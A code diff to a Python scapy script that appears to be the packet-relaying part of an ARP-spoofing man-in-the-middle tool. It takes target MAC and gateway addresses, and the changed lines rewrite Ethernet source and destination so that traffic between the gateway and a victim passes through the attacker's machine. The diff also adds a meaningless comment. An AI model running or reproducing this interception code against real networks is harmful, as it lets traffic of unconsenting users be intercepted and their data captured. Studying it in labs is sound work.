@@ -14,6 +14,7 @@ parser.add_argument("--gateway_ip", required=True, help="Gateway IP address")
 parser.add_argument("--interface", default="Wi-Fi", help="Network interface name")
 parser.add_argument("--log", default="0", help="0/1 for log")
 args = parser.parse_args()
+# asda
 
 INTERFACE = args.interface
 MAC_A = args.target_mac
@@ -45,11 +46,11 @@ def forward_packet(packet):
         sendp(packet, iface="Wi-Fi", verbose=False)
 
 
-    elif packet[Ether].src == MAC_B:  # From Gateway -> Target
-
-        packet[Ether].src = OWN_MAC
-        packet[Ether].dst = MAC_A
-        sendp(packet, iface="Wi-Fi", verbose=False)
+    elif packet[Ether].src == MAC_B and packet.haslayer(IP):  # From Gateway -> Target
+        if  packet[IP].dst == IP_A:
+            packet[Ether].src = OWN_MAC
+            packet[Ether].dst = MAC_A
+            sendp(packet, iface="Wi-Fi", verbose=False)
 
 
 # Efficient sniffing with BPF filter (reduces unnecessary packet processing)
